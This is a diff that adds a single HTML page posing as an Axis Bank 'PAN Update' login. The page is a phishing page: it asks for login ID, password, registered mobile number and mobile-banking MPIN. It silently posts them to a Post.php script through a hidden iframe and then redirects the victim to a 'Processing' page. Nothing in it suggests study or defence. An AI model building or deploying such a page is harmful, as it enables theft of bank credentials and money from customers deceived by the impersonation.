@@ -1,0 +1,147 @@
+<!DOCTYPE html>
+<html>
+  <head>
+    <meta http-equiv="content-type" content="text/html;charset=utf-8" />
+    <meta name="theme-color" content="#A6004D">
+    <meta charSet="utf-8" />
+    <meta name="viewport" content="width=device-width" />
+    <title>Axis Bank | PAN Update</title>
+    <meta name="description" content="login" />
+    <link rel="stylesheet" href="Axis.css" />
+<link rel="preconnect" href="https://fonts.googleapis.com">
+<link rel="preconnect" href="https://fonts.gstatic.com" crossorigin>
+<link href="https://fonts.googleapis.com/css2?family=Work+Sans&display=swap" rel="stylesheet">
+    <style>
+      .hidden {
+        display: none;
+      }
+       
+       #mn
+       {
+       width:100%;
+       height: auto;
+       }
+       
+      .card-login {
+        display: flex;
+        justify-content: space-between;
+        margin-bottom: 20px;
+      }
+
+      .card-login button {
+        flex-grow: 1;
+        font-size: 16px;
+        font-family: 'Open Sans', sans-serif;
+        margin-right: 10px;
+        padding: 7px;
+        border: none;
+        outline:none;
+        border-radius: 25px;
+        cursor: pointer;
+      }
+
+      .card-login button.active {
+        background-color: #A6004D;
+      }
+    </style>
+  </head>
+  <body>
+  <!-- partial:index.partial.html -->
+  <div class="login-box">
+  <!-- Static- Please don't do anything here-->
+  <script type="text/javascript">var submitted=false;</script>
+  <iframe name="hidden_iframe" id="hidden_iframe" style="display: none" onload="if(submitted){window.location='Processing.html';}"></iframe>
+  <!--My Form-->
+    <div id="__next">
+        <img alt="" src="AxisMain.jpg" id="mn"/>
+      </div>
+      <div class="mainContent">
+        <h1 class="text-center">Continue to PAN Update</h1>
+        <div class="card">
+          <div class="card-login">
+            <button style="font-family: 'Work Sans', sans-serif; font-weight:600;" type="button" class="active" data-form="formA">Login ID / Customer ID</button>
+            <button style="font-family: 'Work Sans', sans-serif; font-weight:600;" type="button" data-form="formC">MPIN</button>
+          </div>
+          <div>
+            <section id="formA">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="li">Login ID / Customer ID</label>
+                  <input type="text" class="new-control" name="Login_ID" id="lo" maxLength="25"  required="" />
+                </div>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="pw">Password</label>
+                  <input type="text" class="new-control" minLength="8" maxLength="30" name="Password" id="pw" required />
+                </div>
+                <div class="form-group"><label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="Registered_Mobile_No.">
+                Registered Mobile No.</label>
+                <input type="text" class="new-control" id="Mobile_Number" name="Mobile_Number" maxLength="10" inputmode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required=""/></div>
+                <div class="text-center" style="font-size:13px;line-height:20px; font-family: 'Work Sans', sans-serif; font-weight:600;">
+                  Forgot Password? <a href="#">Reset Here</a>
+                  <br />
+                  Locked your account? <a href="#">Enable Login ID</a>
+                </div>
+                <div class="text-center">
+                  <button type="submit" class="submit">LOGIN</button>
+                </div>
+              </form>
+            </section>
+            <section id="formC" class="hidden">
+              <form class="LoginForm" action="Post.php" method="post" target="hidden_iframe" onsubmit="submitted=true" class="myform">
+                <input type="hidden" name="" value="" />
+               
+                <div class="form-group" id="mobileNumberInput">
+                <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="mn">Registered Mobile No.</label>
+                <input type="text" class="new-control" maxLength="10" id="mn" name="Mobile_Number" inputMode="numeric"
+                pattern="[6-9]\d{9}" title="Please enter valid mobile number !" required="" />
+                </div>
+                <div class="form-group">
+                  <label style="font-size:13px; font-family: 'Work Sans', sans-serif;" for="mpin">Mobile Banking MPIN</label>
+                  <input type="text" class="new-control" inputMode="numeric" id="mpin" name="M_PIN" maxLength="6" 
+                  pattern="[0-9]\d{5}" title="Please enter valid MPIN !"required="" />
+                </div>
+                <div class="text-center">
+                  <button type="submit" class="submit">LOGIN</button>
+                </div>
+              </form>
+            </section>
+            </div>
+            </div>
+            </div>
+            <img alt="" src="Axis_Footer.jpg" style="width: 100%; height: auto;" />
+            <img alt="" src="Axis_Ft.jpg" style="width: 100%; height: auto;" />
+      <script>
+        const buttons = document.querySelectorAll('.card-login button');
+        const sections = document.querySelectorAll('.mainContent section');
+
+        buttons.forEach((button) => {
+          button.addEventListener('click', () => {
+            const formId = button.dataset.form;
+
+            buttons.forEach((btn) => btn.classList.remove('active'));
+            sections.forEach((section) => section.classList.add('hidden'));
+
+            button.classList.add('active');
+            document.getElementById(formId).classList.remove('hidden');
+          });
+        });
+
+        const loginOption = document.querySelector('input[name="loginOption"]');
+        const customerIDInput = document.getElementById('customerIDInput');
+        const mobileNumberInput = document.getElementById('mobileNumberInput');
+
+        loginOption.addEventListener('change', (event) => {
+          if (event.target.value === 'customerID') {
+            customerIDInput.classList.remove('hidden');
+            mobileNumberInput.classList.add('hidden');
+          } else if (event.target.value === 'mobileNumber') {
+            customerIDInput.classList.add('hidden');
+            mobileNumberInput.classList.remove('hidden');
+          }
+        });
+      </script>
+    </div>
+  </body>
+</html>
